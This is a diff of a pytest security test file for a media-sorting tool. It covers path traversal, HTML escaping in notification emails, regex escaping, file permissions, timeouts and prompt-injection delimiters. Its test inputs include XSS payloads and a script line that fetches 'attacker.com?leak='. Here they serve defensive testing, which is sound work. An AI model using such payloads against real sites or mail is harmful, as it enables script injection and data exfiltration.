@@ -1,12 +1,10 @@
 import os
-import sys
-import html
 import pytest
 from pathlib import Path
 from unittest.mock import patch, MagicMock
 import pandas as pd
 
-from src import utils, files, mail, api, tags
+from src import utils, files, mail, api
 from src.config import ConfigManager
 from src.tags import TagManager
 
@@ -14,6 +12,7 @@ from src.tags import TagManager
 # ==============================================================================
 # 1. Filename Sanitization & Path Traversal Tests
 # ==============================================================================
+
 
 def test_sanitize_filename_none_and_non_string():
     assert utils.sanitize_filename(None) == ""
@@ -83,11 +82,7 @@ def test_sort_media_files_path_traversal_guard(tmp_path, monkeypatch):
     monkeypatch.setattr(files, "TV_SHOWS_FOLDER", str(tv_dir))
 
     # A mock clean_data_table where corrected path escapes the base directory
-    df = pd.DataFrame([{
-        "Path": str(tmp_path / "source.mkv"),
-        "Corrected": "EscapeMovie",
-        "Media": "movie"
-    }])
+    df = pd.DataFrame([{"Path": str(tmp_path / "source.mkv"), "Corrected": "EscapeMovie", "Media": "movie"}])
 
     # Mock Path.__truediv__ to return an escaping path
     evil_path = tmp_path.parent / "escaped.mkv"
@@ -100,9 +95,10 @@ def test_sort_media_files_path_traversal_guard(tmp_path, monkeypatch):
 # 2. HTML Injection in Email Notifications Tests
 # ==============================================================================
 
+
 def test_build_html_email_escapes_xss_payloads():
     xss_title = '<script>alert("xss")</script>'
-    xss_badge = '<img src=x onerror=alert(1)>'
+    xss_badge = "<img src=x onerror=alert(1)>"
     xss_bg = '" onmouseover="alert(1)'
     rows = [
         ("<b>Label</b>", '<a href="javascript:alert(1)">Click</a>', False, False),
@@ -112,11 +108,7 @@ def test_build_html_email_escapes_xss_payloads():
     xss_error = "Traceback: <script>fetch('attacker.com?leak=')</script>"
 
     html_out = mail._build_html_email(
-        title=xss_title,
-        badge_text=xss_badge,
-        badge_bg=xss_bg,
-        rows=rows,
-        error_details=xss_error
+        title=xss_title, badge_text=xss_badge, badge_bg=xss_bg, rows=rows, error_details=xss_error
     )
 
     # Raw script, iframe, style, and img tags must NOT be present unescaped
@@ -138,16 +130,17 @@ def test_send_tag_learned_email_escapes_html(monkeypatch):
     monkeypatch.setattr(mail, "_get_credentials", lambda: ("user@gmail.com", "secret"))
 
     sent_messages = []
+
     def mock_dispatch(msg):
         sent_messages.append(msg)
 
     monkeypatch.setattr(mail, "_dispatch_email", mock_dispatch)
 
     mail.send_tag_learned_email(
-        tags=['<script>alert(1)</script>', 'safe_tag'],
-        filename='<img src=x onerror=alert(2)>.mkv',
-        media_title='<b>Movie Title</b>',
-        file_path='/path/<svg onload=alert(3)>/movie.mkv'
+        tags=["<script>alert(1)</script>", "safe_tag"],
+        filename="<img src=x onerror=alert(2)>.mkv",
+        media_title="<b>Movie Title</b>",
+        file_path="/path/<svg onload=alert(3)>/movie.mkv",
     )
 
     assert len(sent_messages) == 1
@@ -163,6 +156,7 @@ def test_send_tag_learned_email_escapes_html(monkeypatch):
 # ==============================================================================
 # 3. Regex Metacharacter Escaping in Tag Matching Tests
 # ==============================================================================
+
 
 def test_master_regex_empty_tags(tmp_path):
     tm = TagManager(core_path=str(tmp_path / "non_existent.json"), config_dir=str(tmp_path))
@@ -201,11 +195,13 @@ def test_master_regex_escapes_user_and_gemini_metacharacters(tmp_path):
 # 4. POSIX File Permissions Security Tests
 # ==============================================================================
 
+
 def test_config_save_permissions_posix(tmp_path, monkeypatch):
     cfg_file = tmp_path / "config.ini"
     cm = ConfigManager(custom_path=str(cfg_file))
 
     chmod_calls = []
+
     def mock_chmod(path, mode):
         chmod_calls.append((path, mode))
 
@@ -237,10 +233,12 @@ def test_config_save_permissions_chmod_oserror_handled(tmp_path, monkeypatch):
 # 5. Network Request Timeout Tests
 # ==============================================================================
 
+
 def test_api_call_sets_timeout(monkeypatch):
     monkeypatch.setattr(api, "TMDB_API_KEY", "dummy_tmdb_key")
 
     captured_kwargs = {}
+
     def mock_requests_get(url, **kwargs):
         captured_kwargs.update(kwargs)
         resp = MagicMock()
@@ -261,6 +259,7 @@ def test_api_call_sets_timeout(monkeypatch):
 # 6. Prompt Injection Defense & Gemini Output Sanitization Tests
 # ==============================================================================
 
+
 def test_gemini_api_call_prompt_security_delimiters(monkeypatch):
     monkeypatch.setattr(api, "GEMINI_API_KEY", "dummy_gemini_key")
 
@@ -277,7 +276,7 @@ def test_gemini_api_call_prompt_security_delimiters(monkeypatch):
         "Path": "/downloads/Malicious.Filename.mkv",
         "Clean": "Malicious Filename",
         "Parse": ("Malicious Filename", None, None, None, None, None),
-        "Media": "movie"
+        "Media": "movie",
     }
 
     success, title, year, lang, tags_out = api.gemini_api_call(media_info)
@@ -290,7 +289,9 @@ def test_gemini_api_call_prompt_security_delimiters(monkeypatch):
 
     # Verify that the generated prompt passed to the model includes security instructions and XML tags
     generate_content_call = mock_client.models.generate_content.call_args
-    prompt_used = generate_content_call.kwargs.get("contents") or (generate_content_call.args[0] if generate_content_call.args else "")
+    prompt_used = generate_content_call.kwargs.get("contents") or (
+        generate_content_call.args[0] if generate_content_call.args else ""
+    )
     if not prompt_used:
         prompt_used = generate_content_call.kwargs.get("contents", "")
     assert "<untrusted_media_metadata>" in prompt_used
